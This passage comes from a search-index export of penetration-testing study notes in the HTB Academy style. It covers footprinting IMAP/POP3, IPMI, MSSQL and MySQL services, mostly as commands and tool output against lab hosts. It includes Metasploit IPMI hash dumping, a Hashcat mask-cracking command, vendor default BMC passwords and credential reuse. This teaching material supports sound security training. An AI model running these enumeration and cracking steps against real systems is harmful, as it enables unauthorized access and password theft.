fd 9a b4 5c-28 a4 c9 36 e4 7d 2a 1e   ..P]...\\(..6.}*.\n\n    Start Time: 1632081313\n    Timeout   : 7200 (sec)\n    Verify return code: 18 (self signed certificate)\n    Extended master secret: no\n    Max Early Data: 0\n---\nread R BLOCK\n+OK HTB-Academy POP3 Server\n</code></pre>","tags":["Pentesting","Information_Gathering","IMAP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/IMAP%20%28143%2C993%29%2CPOP3%20%28110%2C995%29/Footprinting%20the%20Service/#openssl-tls-encrypted-interaction-imap","title":"OpenSSL - TLS Encrypted Interaction IMAP","text":"<pre><code>arenwald@htb[/htb]$ openssl s_client -connect 10.129.14.128:imaps\n\nCONNECTED(00000003)\nCan't use SSL_get_servername\ndepth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb\nverify return:1\n---\nCertificate chain\n 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb\n\n...SNIP...\n\n---\nread R BLOCK\n---\nPost-Handshake New Session Ticket arrived:\nSSL-Session:\n    Protocol  : TLSv1.3\n    Cipher    : TLS_AES_256_GCM_SHA384\n    Session-ID: 2B7148CD1B7B92BA123E06E22831FCD3B365A5EA06B2CDEF1A5F397177130699\n    Session-ID-ctx:\n    Resumption PSK: 4D9F082C6660646C39135F9996DDA2C199C4F7E75D65FA5303F4A0B274D78CC5BD3416C8AF50B31A34EC022B619CC633\n    PSK identity: None\n    PSK identity hint: None\n    SRP username: None\n    TLS session ticket lifetime hint: 7200 (seconds)\n    TLS session ticket:\n    0000 - 68 3b b6 68 ff 85 95 7c-8a 8a 16 b2 97 1c 72 24   h;.h...|......r$\n    0010 - 62 a7 84 ff c3 24 ab 99-de 45 60 26 e7 04 4a 7d   b....$...E`&amp;..J}\n    0020 - bc 6e 06 a0 ff f7 d7 41-b5 1b 49 9c 9f 36 40 8d   .n.....A..I..6@.\n    0030 - 93 35 ed d9 eb 1f 14 d7-a5 f6 3f c8 52 fb 9f 29   .5........?.R..)\n    0040 - 89 8d de e6 46 95 b3 32-48 80 19 bc 46 36 cb eb   ....F..2H...F6..\n    0050 - 35 79 54 4c 57 f8 ee 55-06 e3 59 7f 5e 64 85 b0   5yTLW..U..Y.^d..\n    0060 - f3 a4 8c a6 b6 47 e4 59-ee c9 ab 54 a4 ab 8c 01   .....G.Y...T....\n    0070 - 56 bb b9 bb 3b f6 96 74-16 c9 66 e2 6c 28 c6 12   V...;..t..f.l(..\n    0080 - 34 c7 63 6b ff 71 16 7f-91 69 dc 38 7a 47 46 ec   4.ck.q...i.8zGF.\n    0090 - 67 b7 a2 90 8b 31 58 a0-4f 57 30 6a b6 2e 3a 21   g....1X.OW0j..:!\n    00a0 - 54 c7 ba f0 a9 74 13 11-d5 d1 ec cc ea f9 54 7d   T....t........T}\n    00b0 - 46 a6 33 ed 5d 24 ed b0-20 63 43 d8 8f 14 4d 62   F.3.]$.. cC...Mb\n\n    Start Time: 1632081604\n    Timeout   : 7200 (sec)\n    Verify return code: 18 (self signed certificate)\n    Extended master secret: no\n    Max Early Data: 0\n---\nread R BLOCK\n* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4\n</code></pre> <p>Once we have successfully initiated a connection and logged in to the target mail server, we can use the above commands to work with and navigate the server. We want to point out that the configuration of our own mail server, the research for it, and the experiments we can do together with other community members will give us the know-how to understand the communication taking place and what configuration options are responsible for this.</p> <p>In the SMTP section, we have found the user <code>robin</code>. Another member of our team was able to find out that the user also uses his username as a password (<code>robin</code>:<code>robin</code>). We can use these credentials and try them to interact with the IMAP/POP3 services.</p>","tags":["Pentesting","Information_Gathering","IMAP"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/IPMI%20%28623%29/Dangerous%20Settings/","title":"Dangerous Settings","text":"<p>If default credentials do not work to access a BMC, we can turn to a flaw in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using <code>Hashcat</code> mode <code>7300</code>. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command <code>hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u</code> which tries all combinations of upper case letters and numbers for an eight-character password.</p> <p>There is no direct \"fix\" to this issue because the flaw is a critical component of the IPMI specification. Clients can opt for very long, difficult to crack passwords or implement network segmentation rules to restrict the direct access to the BMCs. It is important to not overlook IPMI during internal penetration tests (we see it during most assessments) because not only can we often gain access to the BMC web console, which is a high-risk finding, but we have seen environments where a unique (but crackable) password is set that is later re-used across other systems. On one such penetration test, we obtained an IPMI hash, cracked it offline using Hashcat, and were able to SSH into many critical servers in the environment as the root user and gain access to web management consoles for various network monitoring tools.</p> <p>To retrieve IPMI hashes, we can use the Metasploit IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval module.</p>","tags":["Pentesting","Information_Gathering","IPMI"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/IPMI%20%28623%29/Dangerous%20Settings/#metasploit-dumping-hashes","title":"Metasploit Dumping Hashes","text":"<pre><code>msf6 &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes \nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; set rhosts 10.129.42.195\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; show options \n\nModule options (auxiliary/scanner/ipmi/ipmi_dumphashes):\n\n   Name                 Current Setting                                                    Required  Description\n   ----                 ---------------                                                    --------  -----------\n   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained\n   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format\n   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format\n   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line\n   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'\n   RPORT                623                                                                yes       The target port\n   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)\n   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line\n\n\n\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; run\n\n[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e\n[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre> <p>Here we can see that we have successfully obtained the password hash for the user <code>ADMIN</code>, and the tool was able to quickly crack it to reveal what appears to be a default password <code>ADMIN</code>. From here, we could attempt to log in to the BMC, or, if the password were something more unique, check for password re-use on other systems. IPMI is very common in network environments since sysadmins need to be able to access servers remotely in the event of an outage or perform certain maintenance tasks that they would traditionally have had to be physically in front of the server to complete. This ease of administration comes with the risk of exposing password hashes to anyone on the network and can lead to unauthorized access, system disruption, and even remote code execution. Checking for IPMI should be part of our internal penetration test playbook for any environment we find ourselves assessing.</p>","tags":["Pentesting","Information_Gathering","IPMI"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/IPMI%20%28623%29/Footprinting%20the%20Service/","title":"Footprinting the Service","text":"<p>IPMI communicates over port 623 UDP. Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs). BMCs are typically implemented as embedded ARM systems running Linux, and connected directly to the host's motherboard. BMCs are built into many motherboards but can also be added to a system as a PCI card. Most servers either come with a BMC or support adding a BMC. The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI. If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system. Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH, and the port 623 UDP, which, again, is for the IPMI network protocol. Below is a sample Nmap scan using the Nmap ipmi-version NSE script to footprint the service.</p>","tags":["Pentesting","Information_Gathering","IPMI"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/IPMI%20%28623%29/Footprinting%20the%20Service/#nmap","title":"Nmap","text":"<pre><code>arenwald@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT\nNmap scan report for ilo.inlanfreight.local (172.16.2.2)\nHost is up (0.00064s latency).\n\nPORT    STATE SERVICE\n623/udp open  asf-rmcp\n| ipmi-version:\n|   Version:\n|     IPMI-2.0\n|   UserAuth:\n|   PassAuth: auth_user, non_null_user\n|_  Level: 2.0\nMAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)\n\nNmap done: 1 IP address (1 host up) scanned in 0.46 seconds\n</code></pre> <p>Here, we can see that the IPMI protocol is indeed listening on port 623, and Nmap has fingerprinted version 2.0 of the protocol. We can also use the Metasploit scanner module IPMI Information Discovery (auxiliary/scanner/ipmi/ipmi_version).</p>","tags":["Pentesting","Information_Gathering","IPMI"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/IPMI%20%28623%29/Footprinting%20the%20Service/#metasploit-version-scan","title":"Metasploit Version Scan","text":"<pre><code>msf6 &gt; use auxiliary/scanner/ipmi/ipmi_version \nmsf6 auxiliary(scanner/ipmi/ipmi_version) &gt; set rhosts 10.129.42.195\nmsf6 auxiliary(scanner/ipmi/ipmi_version) &gt; show options \n\nModule options (auxiliary/scanner/ipmi/ipmi_version):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   BATCHSIZE  256              yes       The number of hosts to probe in each set\n   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'\n   RPORT      623              yes       The target port (UDP)\n   THREADS    10               yes       The number of concurrent threads\n\n\nmsf6 auxiliary(scanner/ipmi/ipmi_version) &gt; run\n\n[*] Sending IPMI requests to 10.129.42.195-&gt;10.129.42.195 (1 hosts)\n[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) \n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre> <p>During internal penetration tests, we often find BMCs where the administrators have not changed the default password. Some unique default passwords to keep in our cheatsheets include:</p> Product Username Password Dell iDRAC root calvin HP iLO Administrator randomized 8-character string consisting of numbers and uppercase letters Supermicro IPMI ADMIN ADMIN <p>It is also essential to try out known default passwords for ANY services that we discover, as these are often left unchanged and can lead to quick wins. When dealing with BMCs, these default passwords may gain us access to the web console or even command line access via SSH or Telnet.</p>","tags":["Pentesting","Information_Gathering","IPMI"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/IPMI%20%28623%29/Overview/","title":"Overview","text":"<p>Intelligent Platform Management Interface (<code>IPMI</code>) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host's BIOS, CPU, firmware, and underlying operating system. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell. IPMI can also be used for remote upgrades to systems without requiring physical access to the target host. IPMI is typically used in three ways:</p> <ul> <li>Before the OS has booted to modify BIOS settings</li> <li>When the host is fully powered down</li> <li>Access to a host after a system failure</li> </ul> <p>When not being used for these tasks, IPMI can monitor a range of different things such as system temperature, voltage, fan status, and power supplies. It can also be used for querying inventory information, reviewing hardware logs, and alerting using SNMP. The host system can be powered off, but the IPMI module requires a power source and a LAN connection to work correctly.</p> <p>The IPMI protocol was first published by Intel in 1998 and is now supported by over 200 system vendors, including Cisco, Dell, HP, Supermicro, Intel, and more. Systems using IPMI version 2.0 can be administered via serial over LAN, giving sysadmins the ability to view serial console output in band. To function, IPMI requires the following components:</p> <ul> <li>Baseboard Management Controller (BMC) - A micro-controller and essential component of an IPMI</li> <li>Intelligent Chassis Management Bus (ICMB) - An interface that permits communication from one chassis to another</li> <li>Intelligent Platform Management Bus (IPMB) - extends the BMC</li> <li>IPMI Memory - stores things such as the system event log, repository store data, and more</li> <li>Communications Interfaces - local system interfaces, serial and LAN interfaces, ICMB and PCI Management Bus</li> </ul>","tags":["Pentesting","Information_Gathering","IPMI"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MSSQL%20%281433%2C1434%2C2433%29/Clients/","title":"Clients","text":"","tags":["Pentesting","Information_Gathering","MSSQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MSSQL%20%281433%2C1434%2C2433%29/Clients/#mssql-clients","title":"MSSQL Clients","text":"<p>SQL Server Management Studio (<code>SSMS</code>) comes as a feature that can be installed with the MSSQL install package or can be downloaded &amp; installed separately. It is commonly installed on the server for initial configuration and long-term management of databases by admins. Keep in mind that since SSMS is a client-side application, it can be installed and used on any system an admin or developer is planning to manage the database from. It doesn't only exist on the server hosting the database. This means we could come across a vulnerable system with SSMS with saved credentials that allow us to connect to the database. The image below shows SSMS in action.</p> <p></p> <p>Many other clients can be used to access a database running on MSSQL. Including but not limited to:</p> mssql-cli SQL Server PowerShell HeidiSQL SQLPro Impacket's mssqlclient.py <p>Of the MSSQL clients listed above, pentesters may find Impacket's mssqlclient.py to be the most useful due to SecureAuthCorp's Impacket project being present on many pentesting distributions at install. To find if and where the client is located on our host, we can use the following command:</p> <pre><code>arenwald@htb[/htb]$ locate mssqlclient\n\n/usr/bin/impacket-mssqlclient\n/usr/share/doc/python3-impacket/examples/mssqlclient.py\n</code></pre>","tags":["Pentesting","Information_Gathering","MSSQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MSSQL%20%281433%2C1434%2C2433%29/Dangerous%20Settings/","title":"Dangerous Settings","text":"<p>It can be beneficial to place ourselves in the perspective of an IT administrator when we are on an engagement. This mindset can help us remember to look for various settings that may have been misconfigured or configured in a dangerous manner by an admin. A workday in IT can be rather busy, with lots of different projects happening simultaneously and the pressure to perform with speed &amp; accuracy being a reality in many organizations, mistakes can be easily made. It only takes one tiny misconfiguration that could compromise a critical server or service on the network. This applies to just about every network service and server role that can be configured, including MSSQL.</p> <p>This is not an extensive list because there are countless ways MSSQL databases can be configured by admins based on the needs of their respective organizations. We may benefit from looking into the following:</p> <ul> <li> <p>MSSQL clients not using encryption to connect to the MSSQL server</p> </li> <li> <p>The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates</p> </li> <li> <p>The use of named pipes</p> </li> <li> <p>Weak &amp; default <code>sa</code> credentials. Admins may forget to disable this account</p> </li> </ul>","tags":["Pentesting","Information_Gathering","MSSQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MSSQL%20%281433%2C1434%2C2433%29/Databases/","title":"Databases","text":"<p>MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server. Here are the default databases and a brief description of each:</p> Default System Database Description <code>master</code> Tracks all system information for an SQL server instance <code>model</code> Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database <code>msdb</code> The SQL Server Agent uses this database to schedule jobs &amp; alerts <code>tempdb</code> Stores temporary objects <code>resource</code> Read-only database containing system objects included with SQL server <p>Table source: System Databases Microsoft Doc</p>","tags":["Pentesting","Information_Gathering","MSSQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MSSQL%20%281433%2C1434%2C2433%29/Default%20Configuration/","title":"Default Configuration","text":"<p>When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as <code>NT SERVICE\\MSSQLSERVER</code>. Connecting from the client-side is possible through Windows Authentication, and by default, encryption is not enforced when attempting to connect.</p> <p></p> <p>Authentication being set to <code>Windows Authentication</code> means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system. Using Active Directory can be ideal for auditing activity and controlling access in a Windows environment, but if an account is compromised, it could lead to privilege escalation and lateral movement across a Windows domain environment. Like with any OS, service, server role, or application, it can be beneficial to set it up in a VM from installation to configuration to understand all the default configurations and potential mistakes that the administrator could make.</p>","tags":["Pentesting","Information_Gathering","MSSQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MSSQL%20%281433%2C1434%2C2433%29/Footprinting%20the%20Service/","title":"Footprinting the Service","text":"<p>There are many ways we can approach footprinting the MSSQL service, the more specific we can get with our scans, the more useful information we will be able to gather. NMAP has default mssql scripts that can be used to target the default tcp port <code>1433</code> that MSSQL listens on.</p> <p>The scripted NMAP scan below provides us with helpful information. We can see the <code>hostname</code>, <code>database instance name</code>, <code>software version of MSSQL</code> and <code>named pipes are enabled</code>. We will benefit from adding these discoveries to our notes.</p>","tags":["Pentesting","Information_Gathering","MSSQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MSSQL%20%281433%2C1434%2C2433%29/Footprinting%20the%20Service/#nmap-mssql-script-scan","title":"NMAP MSSQL Script Scan","text":"<pre><code>arenwald@htb[/htb]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248\n\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 09:40 EST\nNmap scan report for 10.129.201.248\nHost is up (0.15s latency).\n\nPORT     STATE SERVICE  VERSION\n1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ms-sql-ntlm-info: \n|   Target_Name: SQL-01\n|   NetBIOS_Domain_Name: SQL-01\n|   NetBIOS_Computer_Name: SQL-01\n|   DNS_Domain_Name: SQL-01\n|   DNS_Computer_Name: SQL-01\n|_  Product_Version: 10.0.17763\n\nHost script results:\n| ms-sql-dac: \n|_  Instance: MSSQLSERVER; DAC port: 1434 (connection failed)\n| ms-sql-info: \n|   Windows server name: SQL-01\n|   10.129.201.248\\MSSQLSERVER: \n|     Instance name: MSSQLSERVER\n|     Version: \n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|     TCP port: 1433\n|     Named pipe: \\\\10.129.201.248\\pipe\\sql\\query\n|_    Clustered: false\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.52 seconds\n</code></pre> <p>We can also use Metasploit to run an auxiliary scanner called <code>mssql_ping</code> that will scan the MSSQL service and provide helpful information in our footprinting process.</p>","tags":["Pentesting","Information_Gathering","MSSQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MSSQL%20%281433%2C1434%2C2433%29/Footprinting%20the%20Service/#mssql-ping-in-metasploit","title":"MSSQL Ping in Metasploit","text":"<pre><code>msf6 auxiliary(scanner/mssql/mssql_ping) &gt; set rhosts 10.129.201.248\n\nrhosts =&gt; 10.129.201.248\n\n\nmsf6 auxiliary(scanner/mssql/mssql_ping) &gt; run\n\n[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:\n[+] 10.129.201.248:       -    ServerName      = SQL-01\n[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER\n[+] 10.129.201.248:       -    IsClustered     = No\n[+] 10.129.201.248:       -    Version         = 15.0.2000.5\n[+] 10.129.201.248:       -    tcp             = 1433\n[+] 10.129.201.248:       -    np              = \\\\SQL-01\\pipe\\sql\\query\n[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre>","tags":["Pentesting","Information_Gathering","MSSQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MSSQL%20%281433%2C1434%2C2433%29/Footprinting%20the%20Service/#connecting-with-mssqlclientpy","title":"Connecting with Mssqlclient.py","text":"<p>If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (<code>Transact-SQL</code>). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.</p> <pre><code>arenwald@htb[/htb]$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\nPassword:\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(SQL-01): Line 1: Changed database context to 'master'.\n[*] INFO(SQL-01): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\n\nSQL&gt; select name from sys.databases\n\nname                                                                                                                               \n\n--------------------------------------------------------------------------------------\n\nmaster                                                                                                                             \n\ntempdb                                                                                                                             \n\nmodel                                                                                                                              \n\nmsdb                                                                                                                               \n\nTransactions    \n</code></pre>","tags":["Pentesting","Information_Gathering","MSSQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MySQL%20%283306%29/Dangerous%20Settings/","title":"Dangerous Settings","text":"<p>Many things can be misconfigured with MySQL. We can look in more detail at the MySQL reference to determine which options can be made in the server configuration. The main options that are security-relevant are:</p> Settings Description <code>user</code> Sets which user the MySQL service will run as. <code>password</code> Sets the password for the MySQL user. <code>admin_address</code> The IP address on which to listen for TCP/IP connections on the administrative network interface. <code>debug</code> This variable indicates the current debugging settings <code>sql_warnings</code> This variable controls whether single-row INSERT statements produce an information string if warnings occur. <code>secure_file_priv</code> This variable is used to limit the effect of data import and export operations. <p>The settings <code>user</code>, <code>password</code>, and <code>admin_address</code> are security-relevant because the entries are made in plain text. Often, the rights for the configuration file of the MySQL server are not assigned correctly. If we get another way to read files or even a shell, we can see the file and the username and password for the MySQL server. Suppose there are no other security measures to prevent unauthorized access. In that case, the entire database and all the existing customers' information, email addresses, passwords, and personal data can be viewed and even edited.</p> <p>The <code>debug</code> and <code>sql_warnings</code> settings provide verbose information output in case of errors, which are essential for the administrator but should not be seen by others. This information often contains sensitive content, which could be detected by trial and error to identify further attack possibilities. These error messages are often displayed directly on web applications. Accordingly, the SQL injections could be manipulated even to have the MySQL server execute system commands. This is discussed and shown in the module SQL Injection Fundamentals and SQLMap Essentials.</p>","tags":["Pentesting","Information_Gathering","MySQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MySQL%20%283306%29/Default%20Configuration/","title":"Default Configuration","text":"<p>The management of SQL databases and their configurations is a vast topic. It is so large that entire professions, such as <code>database administrator</code>, deal with almost nothing but databases. These structures become very large quickly, and their planning can become complicated. Among other things, DB management is a core competency for <code>software developers</code> but also <code>information security analysts</code>. To cover this area completely would go beyond the scope of this module. Therefore, we recommend setting up a MySQL/MariaDB instance to experiment with the various configurations to understand the available functionality and configuration options better. Let us have a look at the default configuration of MySQL.</p>","tags":["Pentesting","Information_Gathering","MySQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MySQL%20%283306%29/Default%20Configuration/#default-configuration","title":"Default Configuration","text":"<pre><code>arenwald@htb[/htb]$ sudo apt install mysql-server -y\narenwald@htb[/htb]$ cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v \"#\" | sed -r '/^\\s*$/d'\n\n[client]\nport        = 3306\nsocket      = /var/run/mysqld/mysqld.sock\n\n[mysqld_safe]\npid-file    = /var/run/mysqld/mysqld.pid\nsocket      = /var/run/mysqld/mysqld.sock\nnice        = 0\n\n[mysqld]\nskip-host-cache\nskip-name-resolve\nuser        = mysql\npid-file    = /var/run/mysqld/mysqld.pid\nsocket      = /var/run/mysqld/mysqld.sock\nport        = 3306\nbasedir     = /usr\ndatadir     = /var/lib/mysql\ntmpdir      = /tmp\nlc-messages-dir = /usr/share/mysql\nexplicit_defaults_for_timestamp\n\nsymbolic-links=0\n\n!includedir /etc/mysql/conf.d/\n</code></pre>","tags":["Pentesting","Information_Gathering","MySQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MySQL%20%283306%29/Footprinting%20the%20Service/","title":"Footprinting the Service","text":"<p>There are many reasons why a MySQL server could be accessed from an external network. Nevertheless, it is far from being one of the best practices, and we can always find databases that we can reach. Often, these settings were only meant to be temporary but were forgotten by the administrators. This server setup could also be used as a workaround due to a technical problem. Usually, the MySQL server runs on <code>TCP port 3306</code>, and we can scan this port with <code>Nmap</code> to get more detailed information.</p>","tags":["Pentesting","Information_Gathering","MySQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MySQL%20%283306%29/Footprinting%20the%20Service/#scanning-mysql-server","title":"Scanning MySQL Server","text":"<pre><code>arenwald@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 00:53 CEST\nNmap scan report for 10.129.14.128\nHost is up (0.00021s latency).\n\nPORT     STATE SERVICE     VERSION\n3306/tcp open  nagios-nsca Nagios NSCA\n| mysql-brute: \n|   Accounts: \n|     root:&lt;empty&gt; - Valid credentials\n|_  Statistics: Performed 45010 guesses in 5 seconds, average tps: 9002.0\n|_mysql-databases: ERROR: Script execution failed (use -d to debug)\n|_mysql-dump-hashes: ERROR: Script execution failed (use -d to debug)\n| mysql-empty-password: \n|_  root account has empty password\n| mysql-enum: \n|   Valid usernames: \n|     root:&lt;empty&gt; - Valid credentials\n|     netadmin:&lt;empty&gt; - Valid credentials\n|     guest:&lt;empty&gt; - Valid credentials\n|     user:&lt;empty&gt; - Valid credentials\n|     web:&lt;empty&gt; - Valid credentials\n|     sysadmin:&lt;empty&gt; - Valid credentials\n|     administrator:&lt;empty&gt; - Valid credentials\n|     webadmin:&lt;empty&gt; - Valid credentials\n|     admin:&lt;empty&gt; - Valid credentials\n|     test:&lt;empty&gt; - Valid credentials\n|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0\n| mysql-info: \n|   Protocol: 10\n|   Version: 8.0.26-0ubuntu0.20.04.1\n|   Thread ID: 13\n|   Capabilities flags: 65535\n|   Some Capabilities: SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolOld, LongPassword, DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults\n|   Status: Autocommit\n|   Salt: YTSgMfqvx\\x0F\\x7F\\x16\\&amp;\\x1EAeK&gt;0\n|_  Auth Plugin Name: caching_sha2_password\n|_mysql-users: ERROR: Script execution failed (use -d to debug)\n|_mysql-variables: ERROR: Script execution failed (use -d to debug)\n|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.21 seconds\n</code></pre> <p>As with all our scans, we must be careful with the results and manually confirm the information obtained because some of the information might turn out to be a false-positive. This scan above is an excellent example of this, as we know for a fact that the target MySQL server does not use an empty password for the user <code>root</code>, but a fixed password. We can test this with the following command:</p>","tags":["Pentesting","Information_Gathering","MySQL"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/MySQL%20%283306%29/Footprinting%20the%20Service/#interaction-with-the-mysql-server","title":"Interaction with the MySQL Server","text":"<pre><code>arenwald@htb[/htb]$ mysql -u root -h 10.129.14.132\n\nERROR 1045 (28000): Access denied for user 'root'@'10.129.14.1' (using password: NO)\n</code></pre> <p>For example, if we use a password that we have guessed or found through our research, we will be able to log in to the MySQL server and execute some commands.</p> <pre><code>arenwald@htb[/htb]$ mysql -u root -pP4SSw0rd -h 10.129.14.128\n\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 150165\nServer version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)                                                         \nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.                                     \nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.                           \n\nMySQL [(none)]&gt; show databases;                                                                          \n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| mysql              